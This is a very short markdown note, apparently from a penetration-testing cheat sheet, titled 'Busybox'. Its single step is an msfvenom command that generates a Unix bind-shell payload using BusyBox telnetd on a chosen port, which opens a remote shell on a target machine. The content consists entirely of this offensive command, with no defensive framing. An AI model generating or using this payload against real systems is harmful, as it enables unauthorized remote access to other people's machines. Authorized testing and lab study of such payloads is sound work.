# Busybox

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_busybox_telnetd lport=<PORT>
```